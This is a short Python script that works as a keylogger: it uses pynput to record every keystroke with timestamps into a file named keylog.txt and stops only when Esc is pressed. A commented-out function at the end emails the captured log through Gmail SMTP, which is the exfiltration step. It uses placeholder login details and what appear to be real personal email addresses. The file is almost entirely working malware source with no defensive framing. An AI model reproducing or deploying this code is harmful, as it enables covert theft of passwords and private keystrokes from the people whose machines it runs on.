from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# import smtplib
# def send_logs():
#     with open("keylog.txt", "r") as f:
#         data = f.read()
#     server = smtplib.SMTP("smtp.gmail.com", 587)
#     server.starttls()
#     server.login("your_email@gmail.com", "password")
#     server.sendmail("alirizvi433@gmail.com", "aestheticallyobscure@gmail.com", data)
